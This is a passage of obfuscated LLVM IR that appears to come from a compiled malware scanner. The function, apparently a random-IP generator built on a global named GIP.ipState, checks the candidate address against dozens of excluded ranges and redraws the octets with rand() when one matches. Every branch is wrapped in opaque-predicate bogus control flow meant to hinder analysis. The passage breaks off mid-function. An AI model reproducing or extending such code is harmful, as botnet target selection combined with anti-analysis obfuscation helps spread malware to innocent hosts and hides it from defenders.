  %4643 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4644 = zext i8 %4643 to i32
  %4645 = icmp eq i32 %4644, 89
  br i1 %4645, label %4646, label %4674

; <label>:4646:                                   ; preds = %4642
  %4647 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4648 = zext i8 %4647 to i32
  %4649 = icmp eq i32 %4648, 34
  br i1 %4649, label %4650, label %4674

; <label>:4650:                                   ; preds = %4646
  %4651 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4652 = zext i8 %4651 to i32
  %4653 = icmp sge i32 %4652, 96
  br i1 %4653, label %4654, label %4674

; <label>:4654:                                   ; preds = %4650
  %4655 = load i32, i32* @x.69
  %4656 = load i32, i32* @y.70
  %4657 = sub i32 %4655, 1
  %4658 = mul i32 %4655, %4657
  %4659 = urem i32 %4658, 2
  %4660 = icmp eq i32 %4659, 0
  %4661 = icmp slt i32 %4656, 10
  %4662 = or i1 %4660, %4661
  br i1 %4662, label %originalBB632, label %originalBB632alteredBB

originalBB632:                                    ; preds = %originalBB632alteredBB, %4654
  %4663 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4664 = zext i8 %4663 to i32
  %4665 = icmp slt i32 %4664, 97
  %4666 = load i32, i32* @x.69
  %4667 = load i32, i32* @y.70
  %4668 = sub i32 %4666, 1
  %4669 = mul i32 %4666, %4668
  %4670 = urem i32 %4669, 2
  %4671 = icmp eq i32 %4670, 0
  %4672 = icmp slt i32 %4667, 10
  %4673 = or i1 %4671, %4672
  br i1 %4673, label %originalBBpart2634, label %originalBB632alteredBB

originalBBpart2634:                               ; preds = %originalBB632
  br i1 %4665, label %4994, label %4674

; <label>:4674:                                   ; preds = %originalBBpart2634, %4650, %4646, %4642
  %4675 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4676 = zext i8 %4675 to i32
  %4677 = icmp eq i32 %4676, 219
  br i1 %4677, label %4678, label %4686

; <label>:4678:                                   ; preds = %4674
  %4679 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4680 = zext i8 %4679 to i32
  %4681 = icmp sge i32 %4680, 216
  br i1 %4681, label %4682, label %4686

; <label>:4682:                                   ; preds = %4678
  %4683 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4684 = zext i8 %4683 to i32
  %4685 = icmp slt i32 %4684, 231
  br i1 %4685, label %4994, label %4686

; <label>:4686:                                   ; preds = %4682, %4678, %4674
  %4687 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4688 = zext i8 %4687 to i32
  %4689 = icmp eq i32 %4688, 23
  br i1 %4689, label %4690, label %4714

; <label>:4690:                                   ; preds = %4686
  %4691 = load i32, i32* @x.69
  %4692 = load i32, i32* @y.70
  %4693 = sub i32 %4691, 1
  %4694 = mul i32 %4691, %4693
  %4695 = urem i32 %4694, 2
  %4696 = icmp eq i32 %4695, 0
  %4697 = icmp slt i32 %4692, 10
  %4698 = or i1 %4696, %4697
  br i1 %4698, label %originalBB636, label %originalBB636alteredBB

originalBB636:                                    ; preds = %originalBB636alteredBB, %4690
  %4699 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4700 = zext i8 %4699 to i32
  %4701 = icmp sge i32 %4700, 94
  %4702 = load i32, i32* @x.69
  %4703 = load i32, i32* @y.70
  %4704 = sub i32 %4702, 1
  %4705 = mul i32 %4702, %4704
  %4706 = urem i32 %4705, 2
  %4707 = icmp eq i32 %4706, 0
  %4708 = icmp slt i32 %4703, 10
  %4709 = or i1 %4707, %4708
  br i1 %4709, label %originalBBpart2638, label %originalBB636alteredBB

originalBBpart2638:                               ; preds = %originalBB636
  br i1 %4701, label %4710, label %4714

; <label>:4710:                                   ; preds = %originalBBpart2638
  %4711 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4712 = zext i8 %4711 to i32
  %4713 = icmp slt i32 %4712, 109
  br i1 %4713, label %4994, label %4714

; <label>:4714:                                   ; preds = %4710, %originalBBpart2638, %4686
  %4715 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4716 = zext i8 %4715 to i32
  %4717 = icmp eq i32 %4716, 178
  br i1 %4717, label %4718, label %4726

; <label>:4718:                                   ; preds = %4714
  %4719 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4720 = zext i8 %4719 to i32
  %4721 = icmp sge i32 %4720, 62
  br i1 %4721, label %4722, label %4726

; <label>:4722:                                   ; preds = %4718
  %4723 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4724 = zext i8 %4723 to i32
  %4725 = icmp slt i32 %4724, 63
  br i1 %4725, label %4994, label %4726

; <label>:4726:                                   ; preds = %4722, %4718, %4714
  %4727 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4728 = zext i8 %4727 to i32
  %4729 = icmp eq i32 %4728, 106
  br i1 %4729, label %4730, label %4754

; <label>:4730:                                   ; preds = %4726
  %4731 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4732 = zext i8 %4731 to i32
  %4733 = icmp sge i32 %4732, 182
  br i1 %4733, label %4734, label %4754

; <label>:4734:                                   ; preds = %4730
  %4735 = load i32, i32* @x.69
  %4736 = load i32, i32* @y.70
  %4737 = sub i32 %4735, 1
  %4738 = mul i32 %4735, %4737
  %4739 = urem i32 %4738, 2
  %4740 = icmp eq i32 %4739, 0
  %4741 = icmp slt i32 %4736, 10
  %4742 = or i1 %4740, %4741
  br i1 %4742, label %originalBB640, label %originalBB640alteredBB

originalBB640:                                    ; preds = %originalBB640alteredBB, %4734
  %4743 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4744 = zext i8 %4743 to i32
  %4745 = icmp slt i32 %4744, 189
  %4746 = load i32, i32* @x.69
  %4747 = load i32, i32* @y.70
  %4748 = sub i32 %4746, 1
  %4749 = mul i32 %4746, %4748
  %4750 = urem i32 %4749, 2
  %4751 = icmp eq i32 %4750, 0
  %4752 = icmp slt i32 %4747, 10
  %4753 = or i1 %4751, %4752
  br i1 %4753, label %originalBBpart2642, label %originalBB640alteredBB

originalBBpart2642:                               ; preds = %originalBB640
  br i1 %4745, label %4994, label %4754

; <label>:4754:                                   ; preds = %originalBBpart2642, %4730, %4726
  %4755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4756 = zext i8 %4755 to i32
  %4757 = icmp eq i32 %4756, 106
  br i1 %4757, label %4758, label %4778

; <label>:4758:                                   ; preds = %4754
  %4759 = load i32, i32* @x.69
  %4760 = load i32, i32* @y.70
  %4761 = sub i32 %4759, 1
  %4762 = mul i32 %4759, %4761
  %4763 = urem i32 %4762, 2
  %4764 = icmp eq i32 %4763, 0
  %4765 = icmp slt i32 %4760, 10
  %4766 = or i1 %4764, %4765
  br i1 %4766, label %originalBB644, label %originalBB644alteredBB

originalBB644:                                    ; preds = %originalBB644alteredBB, %4758
  %4767 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4768 = zext i8 %4767 to i32
  %4769 = icmp sge i32 %4768, 184
  %4770 = load i32, i32* @x.69
  %4771 = load i32, i32* @y.70
  %4772 = sub i32 %4770, 1
  %4773 = mul i32 %4770, %4772
  %4774 = urem i32 %4773, 2
  %4775 = icmp eq i32 %4774, 0
  %4776 = icmp slt i32 %4771, 10
  %4777 = or i1 %4775, %4776
  br i1 %4777, label %originalBBpart2646, label %originalBB644alteredBB

originalBBpart2646:                               ; preds = %originalBB644
  br i1 %4769, label %4994, label %4778

; <label>:4778:                                   ; preds = %originalBBpart2646, %4754
  %4779 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4780 = zext i8 %4779 to i32
  %4781 = icmp eq i32 %4780, 106
  br i1 %4781, label %4782, label %4802

; <label>:4782:                                   ; preds = %4778
  %4783 = load i32, i32* @x.69
  %4784 = load i32, i32* @y.70
  %4785 = sub i32 %4783, 1
  %4786 = mul i32 %4783, %4785
  %4787 = urem i32 %4786, 2
  %4788 = icmp eq i32 %4787, 0
  %4789 = icmp slt i32 %4784, 10
  %4790 = or i1 %4788, %4789
  br i1 %4790, label %originalBB648, label %originalBB648alteredBB

originalBB648:                                    ; preds = %originalBB648alteredBB, %4782
  %4791 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4792 = zext i8 %4791 to i32
  %4793 = icmp eq i32 %4792, 105
  %4794 = load i32, i32* @x.69
  %4795 = load i32, i32* @y.70
  %4796 = sub i32 %4794, 1
  %4797 = mul i32 %4794, %4796
  %4798 = urem i32 %4797, 2
  %4799 = icmp eq i32 %4798, 0
  %4800 = icmp slt i32 %4795, 10
  %4801 = or i1 %4799, %4800
  br i1 %4801, label %originalBBpart2650, label %originalBB648alteredBB

originalBBpart2650:                               ; preds = %originalBB648
  br i1 %4793, label %4994, label %4802

; <label>:4802:                                   ; preds = %originalBBpart2650, %4778
  %4803 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4804 = zext i8 %4803 to i32
  %4805 = icmp eq i32 %4804, 34
  br i1 %4805, label %4806, label %4814

; <label>:4806:                                   ; preds = %4802
  %4807 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4808 = zext i8 %4807 to i32
  %4809 = icmp sge i32 %4808, 245
  br i1 %4809, label %4810, label %4814

; <label>:4810:                                   ; preds = %4806
  %4811 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4812 = zext i8 %4811 to i32
  %4813 = icmp slt i32 %4812, 255
  br i1 %4813, label %4994, label %4814

; <label>:4814:                                   ; preds = %4810, %4806, %4802
  %4815 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4816 = zext i8 %4815 to i32
  %4817 = icmp eq i32 %4816, 87
  br i1 %4817, label %4818, label %4826

; <label>:4818:                                   ; preds = %4814
  %4819 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4820 = zext i8 %4819 to i32
  %4821 = icmp sge i32 %4820, 97
  br i1 %4821, label %4822, label %4826

; <label>:4822:                                   ; preds = %4818
  %4823 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4824 = zext i8 %4823 to i32
  %4825 = icmp slt i32 %4824, 99
  br i1 %4825, label %4994, label %4826

; <label>:4826:                                   ; preds = %4822, %4818, %4814
  %4827 = load i32, i32* @x.69
  %4828 = load i32, i32* @y.70
  %4829 = sub i32 %4827, 1
  %4830 = mul i32 %4827, %4829
  %4831 = urem i32 %4830, 2
  %4832 = icmp eq i32 %4831, 0
  %4833 = icmp slt i32 %4828, 10
  %4834 = or i1 %4832, %4833
  br i1 %4834, label %originalBB652, label %originalBB652alteredBB

originalBB652:                                    ; preds = %originalBB652alteredBB, %4826
  %4835 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4836 = zext i8 %4835 to i32
  %4837 = icmp eq i32 %4836, 86
  %4838 = load i32, i32* @x.69
  %4839 = load i32, i32* @y.70
  %4840 = sub i32 %4838, 1
  %4841 = mul i32 %4838, %4840
  %4842 = urem i32 %4841, 2
  %4843 = icmp eq i32 %4842, 0
  %4844 = icmp slt i32 %4839, 10
  %4845 = or i1 %4843, %4844
  br i1 %4845, label %originalBBpart2654, label %originalBB652alteredBB

originalBBpart2654:                               ; preds = %originalBB652
  br i1 %4837, label %4846, label %4850

; <label>:4846:                                   ; preds = %originalBBpart2654
  %4847 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4848 = zext i8 %4847 to i32
  %4849 = icmp eq i32 %4848, 208
  br i1 %4849, label %4994, label %4850

; <label>:4850:                                   ; preds = %4846, %originalBBpart2654
  %4851 = load i32, i32* @x.69
  %4852 = load i32, i32* @y.70
  %4853 = sub i32 %4851, 1
  %4854 = mul i32 %4851, %4853
  %4855 = urem i32 %4854, 2
  %4856 = icmp eq i32 %4855, 0
  %4857 = icmp slt i32 %4852, 10
  %4858 = or i1 %4856, %4857
  br i1 %4858, label %originalBB656, label %originalBB656alteredBB

originalBB656:                                    ; preds = %originalBB656alteredBB, %4850
  %4859 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4860 = zext i8 %4859 to i32
  %4861 = icmp eq i32 %4860, 86
  %4862 = load i32, i32* @x.69
  %4863 = load i32, i32* @y.70
  %4864 = sub i32 %4862, 1
  %4865 = mul i32 %4862, %4864
  %4866 = urem i32 %4865, 2
  %4867 = icmp eq i32 %4866, 0
  %4868 = icmp slt i32 %4863, 10
  %4869 = or i1 %4867, %4868
  br i1 %4869, label %originalBBpart2658, label %originalBB656alteredBB

originalBBpart2658:                               ; preds = %originalBB656
  br i1 %4861, label %4870, label %4890

; <label>:4870:                                   ; preds = %originalBBpart2658
  %4871 = load i32, i32* @x.69
  %4872 = load i32, i32* @y.70
  %4873 = sub i32 %4871, 1
  %4874 = mul i32 %4871, %4873
  %4875 = urem i32 %4874, 2
  %4876 = icmp eq i32 %4875, 0
  %4877 = icmp slt i32 %4872, 10
  %4878 = or i1 %4876, %4877
  br i1 %4878, label %originalBB660, label %originalBB660alteredBB

originalBB660:                                    ; preds = %originalBB660alteredBB, %4870
  %4879 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4880 = zext i8 %4879 to i32
  %4881 = icmp eq i32 %4880, 209
  %4882 = load i32, i32* @x.69
  %4883 = load i32, i32* @y.70
  %4884 = sub i32 %4882, 1
  %4885 = mul i32 %4882, %4884
  %4886 = urem i32 %4885, 2
  %4887 = icmp eq i32 %4886, 0
  %4888 = icmp slt i32 %4883, 10
  %4889 = or i1 %4887, %4888
  br i1 %4889, label %originalBBpart2662, label %originalBB660alteredBB

originalBBpart2662:                               ; preds = %originalBB660
  br i1 %4881, label %4994, label %4890

; <label>:4890:                                   ; preds = %originalBBpart2662, %originalBBpart2658
  %4891 = load i32, i32* @x.69
  %4892 = load i32, i32* @y.70
  %4893 = sub i32 %4891, 1
  %4894 = mul i32 %4891, %4893
  %4895 = urem i32 %4894, 2
  %4896 = icmp eq i32 %4895, 0
  %4897 = icmp slt i32 %4892, 10
  %4898 = or i1 %4896, %4897
  br i1 %4898, label %originalBB664, label %originalBB664alteredBB

originalBB664:                                    ; preds = %originalBB664alteredBB, %4890
  %4899 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4900 = zext i8 %4899 to i32
  %4901 = icmp eq i32 %4900, 193
  %4902 = load i32, i32* @x.69
  %4903 = load i32, i32* @y.70
  %4904 = sub i32 %4902, 1
  %4905 = mul i32 %4902, %4904
  %4906 = urem i32 %4905, 2
  %4907 = icmp eq i32 %4906, 0
  %4908 = icmp slt i32 %4903, 10
  %4909 = or i1 %4907, %4908
  br i1 %4909, label %originalBBpart2666, label %originalBB664alteredBB

originalBBpart2666:                               ; preds = %originalBB664
  br i1 %4901, label %4910, label %4930

; <label>:4910:                                   ; preds = %originalBBpart2666
  %4911 = load i32, i32* @x.69
  %4912 = load i32, i32* @y.70
  %4913 = sub i32 %4911, 1
  %4914 = mul i32 %4911, %4913
  %4915 = urem i32 %4914, 2
  %4916 = icmp eq i32 %4915, 0
  %4917 = icmp slt i32 %4912, 10
  %4918 = or i1 %4916, %4917
  br i1 %4918, label %originalBB668, label %originalBB668alteredBB

originalBB668:                                    ; preds = %originalBB668alteredBB, %4910
  %4919 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4920 = zext i8 %4919 to i32
  %4921 = icmp eq i32 %4920, 164
  %4922 = load i32, i32* @x.69
  %4923 = load i32, i32* @y.70
  %4924 = sub i32 %4922, 1
  %4925 = mul i32 %4922, %4924
  %4926 = urem i32 %4925, 2
  %4927 = icmp eq i32 %4926, 0
  %4928 = icmp slt i32 %4923, 10
  %4929 = or i1 %4927, %4928
  br i1 %4929, label %originalBBpart2670, label %originalBB668alteredBB

originalBBpart2670:                               ; preds = %originalBB668
  br i1 %4921, label %4994, label %4930

; <label>:4930:                                   ; preds = %originalBBpart2670, %originalBBpart2666
  %4931 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4932 = zext i8 %4931 to i32
  %4933 = icmp eq i32 %4932, 120
  br i1 %4933, label %4934, label %4942

; <label>:4934:                                   ; preds = %4930
  %4935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4936 = zext i8 %4935 to i32
  %4937 = icmp sge i32 %4936, 103
  br i1 %4937, label %4938, label %4942

; <label>:4938:                                   ; preds = %4934
  %4939 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4940 = zext i8 %4939 to i32
  %4941 = icmp slt i32 %4940, 108
  br i1 %4941, label %4994, label %4942

; <label>:4942:                                   ; preds = %4938, %4934, %4930
  %4943 = load i32, i32* @x.69
  %4944 = load i32, i32* @y.70
  %4945 = sub i32 %4943, 1
  %4946 = mul i32 %4943, %4945
  %4947 = urem i32 %4946, 2
  %4948 = icmp eq i32 %4947, 0
  %4949 = icmp slt i32 %4944, 10
  %4950 = or i1 %4948, %4949
  br i1 %4950, label %originalBB672, label %originalBB672alteredBB

originalBB672:                                    ; preds = %originalBB672alteredBB, %4942
  %4951 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4952 = zext i8 %4951 to i32
  %4953 = icmp eq i32 %4952, 188
  %4954 = load i32, i32* @x.69
  %4955 = load i32, i32* @y.70
  %4956 = sub i32 %4954, 1
  %4957 = mul i32 %4954, %4956
  %4958 = urem i32 %4957, 2
  %4959 = icmp eq i32 %4958, 0
  %4960 = icmp slt i32 %4955, 10
  %4961 = or i1 %4959, %4960
  br i1 %4961, label %originalBBpart2674, label %originalBB672alteredBB

originalBBpart2674:                               ; preds = %originalBB672
  br i1 %4953, label %4962, label %4966

; <label>:4962:                                   ; preds = %originalBBpart2674
  %4963 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4964 = zext i8 %4963 to i32
  %4965 = icmp eq i32 %4964, 68
  br i1 %4965, label %4994, label %4966

; <label>:4966:                                   ; preds = %4962, %originalBBpart2674
  %4967 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4968 = zext i8 %4967 to i32
  %4969 = icmp eq i32 %4968, 78
  br i1 %4969, label %4970, label %4974

; <label>:4970:                                   ; preds = %4966
  %4971 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4972 = zext i8 %4971 to i32
  %4973 = icmp eq i32 %4972, 46
  br i1 %4973, label %4994, label %4974

; <label>:4974:                                   ; preds = %4970, %4966
  %4975 = load i32, i32* @x.69
  %4976 = load i32, i32* @y.70
  %4977 = sub i32 %4975, 1
  %4978 = mul i32 %4975, %4977
  %4979 = urem i32 %4978, 2
  %4980 = icmp eq i32 %4979, 0
  %4981 = icmp slt i32 %4976, 10
  %4982 = or i1 %4980, %4981
  br i1 %4982, label %originalBB676, label %originalBB676alteredBB

originalBB676:                                    ; preds = %originalBB676alteredBB, %4974
  %4983 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4984 = zext i8 %4983 to i32
  %4985 = icmp eq i32 %4984, 224
  %4986 = load i32, i32* @x.69
  %4987 = load i32, i32* @y.70
  %4988 = sub i32 %4986, 1
  %4989 = mul i32 %4986, %4988
  %4990 = urem i32 %4989, 2
  %4991 = icmp eq i32 %4990, 0
  %4992 = icmp slt i32 %4987, 10
  %4993 = or i1 %4991, %4992
  br i1 %4993, label %originalBBpart2678, label %originalBB676alteredBB

originalBBpart2678:                               ; preds = %originalBB676
  br label %4994

; <label>:4994:                                   ; preds = %originalBBpart2678, %4970, %4962, %4938, %originalBBpart2670, %originalBBpart2662, %4846, %4822, %4810, %originalBBpart2650, %originalBBpart2646, %originalBBpart2642, %4722, %4710, %4682, %originalBBpart2634, %originalBBpart2630, %4606, %originalBBpart2626, %4546, %4538, %4526, %originalBBpart2618, %originalBBpart2614, %4442, %4430, %4418, %4406, %originalBBpart2606, %4346, %4314, %originalBBpart2594, %4234, %originalBBpart2578, %originalBBpart2574, %4138, %4106, %4074, %4058, %4026, %3962, %originalBBpart2538, %originalBBpart2530, %3834, %originalBBpart2526, %3786, %3754, %3746, %originalBBpart2518, %originalBBpart2514, %originalBBpart2510, %3666, %3642, %originalBBpart2498, %originalBBpart2490, %3554, %3546, %3538, %3530, %3522, %originalBBpart2482, %3474, %3466, %3458, %3442, %originalBBpart2470, %3346, %originalBBpart2458, %3234, %3218, %3186, %3170, %3154, %3138, %3106, %3090, %3082, %3074, %3042, %3010, %originalBBpart2426, %2930, %2882, %originalBBpart2402, %originalBBpart2390, %2738, %originalBBpart2374, %2626, %2578, %originalBBpart2354, %2498, %2482, %2466, %2434, %2402, %2370, %originalBBpart2330, %originalBBpart2326, %originalBBpart2322, %originalBBpart2318, %2242, %2234, %2226, %2218, %2210, %2202, %2178, %2154, %originalBBpart2302, %2106, %2098, %originalBBpart2298, %2058, %2046, %2018, %2006, %1994, %1982, %1970, %1958, %1946, %1934, %1922, %1894, %1882, %originalBBpart2286, %1826, %1798, %1770, %1726, %originalBBpart2258, %1670, %1642, %originalBBpart2246, %originalBBpart2238, %1542, %1498, %originalBBpart2222, %1426, %1414, %1386, %originalBBpart2210, %1314, %1286, %1258, %originalBBpart2186, %originalBBpart2174, %1142, %1130, %1118, %1106, %1094, %1070, %originalBBpart2162, %originalBBpart2154, %974, %966, %originalBBpart2150, %originalBBpart2142, %894, %originalBBpart2138, %originalBBpart2134, %822, %originalBBpart2122, %758, %750, %originalBBpart2114, %718, %710, %702, %694, %686, %678, %670, %646, %622, %598, %originalBBpart298, %550, %originalBBpart290, %502, %494, %486, %originalBBpart282, %454, %originalBBpart278, %422, %398, %390, %originalBBpart270, %originalBBpart266, %334, %326, %originalBBpart262, %originalBBpart258, %274, %originalBBpart254, %originalBBpart250, %230, %226, %222, %originalBBpart246, %originalBBpart242, %originalBBpart238, %158, %originalBBpart234, %134, %130, %126, %originalBBpart230, %102, %originalBBpart226, %78, %originalBBpart222, %54, %originalBBpart218, %30
  %4995 = phi i1 [ true, %4970 ], [ true, %4962 ], [ true, %4938 ], [ true, %originalBBpart2670 ], [ true, %originalBBpart2662 ], [ true, %4846 ], [ true, %4822 ], [ true, %4810 ], [ true, %originalBBpart2650 ], [ true, %originalBBpart2646 ], [ true, %originalBBpart2642 ], [ true, %4722 ], [ true, %4710 ], [ true, %4682 ], [ true, %originalBBpart2634 ], [ true, %originalBBpart2630 ], [ true, %4606 ], [ true, %originalBBpart2626 ], [ true, %4546 ], [ true, %4538 ], [ true, %4526 ], [ true, %originalBBpart2618 ], [ true, %originalBBpart2614 ], [ true, %4442 ], [ true, %4430 ], [ true, %4418 ], [ true, %4406 ], [ true, %originalBBpart2606 ], [ true, %4346 ], [ true, %4314 ], [ true, %originalBBpart2594 ], [ true, %4234 ], [ true, %originalBBpart2578 ], [ true, %originalBBpart2574 ], [ true, %4138 ], [ true, %4106 ], [ true, %4074 ], [ true, %4058 ], [ true, %4026 ], [ true, %3962 ], [ true, %originalBBpart2538 ], [ true, %originalBBpart2530 ], [ true, %3834 ], [ true, %originalBBpart2526 ], [ true, %3786 ], [ true, %3754 ], [ true, %3746 ], [ true, %originalBBpart2518 ], [ true, %originalBBpart2514 ], [ true, %originalBBpart2510 ], [ true, %3666 ], [ true, %3642 ], [ true, %originalBBpart2498 ], [ true, %originalBBpart2490 ], [ true, %3554 ], [ true, %3546 ], [ true, %3538 ], [ true, %3530 ], [ true, %3522 ], [ true, %originalBBpart2482 ], [ true, %3474 ], [ true, %3466 ], [ true, %3458 ], [ true, %3442 ], [ true, %originalBBpart2470 ], [ true, %3346 ], [ true, %originalBBpart2458 ], [ true, %3234 ], [ true, %3218 ], [ true, %3186 ], [ true, %3170 ], [ true, %3154 ], [ true, %3138 ], [ true, %3106 ], [ true, %3090 ], [ true, %3082 ], [ true, %3074 ], [ true, %3042 ], [ true, %3010 ], [ true, %originalBBpart2426 ], [ true, %2930 ], [ true, %2882 ], [ true, %originalBBpart2402 ], [ true, %originalBBpart2390 ], [ true, %2738 ], [ true, %originalBBpart2374 ], [ true, %2626 ], [ true, %2578 ], [ true, %originalBBpart2354 ], [ true, %2498 ], [ true, %2482 ], [ true, %2466 ], [ true, %2434 ], [ true, %2402 ], [ true, %2370 ], [ true, %originalBBpart2330 ], [ true, %originalBBpart2326 ], [ true, %originalBBpart2322 ], [ true, %originalBBpart2318 ], [ true, %2242 ], [ true, %2234 ], [ true, %2226 ], [ true, %2218 ], [ true, %2210 ], [ true, %2202 ], [ true, %2178 ], [ true, %2154 ], [ true, %originalBBpart2302 ], [ true, %2106 ], [ true, %2098 ], [ true, %originalBBpart2298 ], [ true, %2058 ], [ true, %2046 ], [ true, %2018 ], [ true, %2006 ], [ true, %1994 ], [ true, %1982 ], [ true, %1970 ], [ true, %1958 ], [ true, %1946 ], [ true, %1934 ], [ true, %1922 ], [ true, %1894 ], [ true, %1882 ], [ true, %originalBBpart2286 ], [ true, %1826 ], [ true, %1798 ], [ true, %1770 ], [ true, %1726 ], [ true, %originalBBpart2258 ], [ true, %1670 ], [ true, %1642 ], [ true, %originalBBpart2246 ], [ true, %originalBBpart2238 ], [ true, %1542 ], [ true, %1498 ], [ true, %originalBBpart2222 ], [ true, %1426 ], [ true, %1414 ], [ true, %1386 ], [ true, %originalBBpart2210 ], [ true, %1314 ], [ true, %1286 ], [ true, %1258 ], [ true, %originalBBpart2186 ], [ true, %originalBBpart2174 ], [ true, %1142 ], [ true, %1130 ], [ true, %1118 ], [ true, %1106 ], [ true, %1094 ], [ true, %1070 ], [ true, %originalBBpart2162 ], [ true, %originalBBpart2154 ], [ true, %974 ], [ true, %966 ], [ true, %originalBBpart2150 ], [ true, %originalBBpart2142 ], [ true, %894 ], [ true, %originalBBpart2138 ], [ true, %originalBBpart2134 ], [ true, %822 ], [ true, %originalBBpart2122 ], [ true, %758 ], [ true, %750 ], [ true, %originalBBpart2114 ], [ true, %718 ], [ true, %710 ], [ true, %702 ], [ true, %694 ], [ true, %686 ], [ true, %678 ], [ true, %670 ], [ true, %646 ], [ true, %622 ], [ true, %598 ], [ true, %originalBBpart298 ], [ true, %550 ], [ true, %originalBBpart290 ], [ true, %502 ], [ true, %494 ], [ true, %486 ], [ true, %originalBBpart282 ], [ true, %454 ], [ true, %originalBBpart278 ], [ true, %422 ], [ true, %398 ], [ true, %390 ], [ true, %originalBBpart270 ], [ true, %originalBBpart266 ], [ true, %334 ], [ true, %326 ], [ true, %originalBBpart262 ], [ true, %originalBBpart258 ], [ true, %274 ], [ true, %originalBBpart254 ], [ true, %originalBBpart250 ], [ true, %230 ], [ true, %226 ], [ true, %222 ], [ true, %originalBBpart246 ], [ true, %originalBBpart242 ], [ true, %originalBBpart238 ], [ true, %158 ], [ true, %originalBBpart234 ], [ true, %134 ], [ true, %130 ], [ true, %126 ], [ true, %originalBBpart230 ], [ true, %102 ], [ true, %originalBBpart226 ], [ true, %78 ], [ true, %originalBBpart222 ], [ true, %54 ], [ true, %originalBBpart218 ], [ true, %30 ], [ %4985, %originalBBpart2678 ]
  br i1 %4995, label %4996, label %5009

; <label>:4996:                                   ; preds = %4994
  %4997 = call i32 @rand() #3
  %4998 = srem i32 %4997, 223
  %4999 = trunc i32 %4998 to i8
  store i8 %4999, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5000 = call i32 @rand() #3
  %5001 = srem i32 %5000, 255
  %5002 = trunc i32 %5001 to i8
  store i8 %5002, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5003 = call i32 @rand() #3
  %5004 = srem i32 %5003, 255
  %5005 = trunc i32 %5004 to i8
  store i8 %5005, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5006 = call i32 @rand() #3
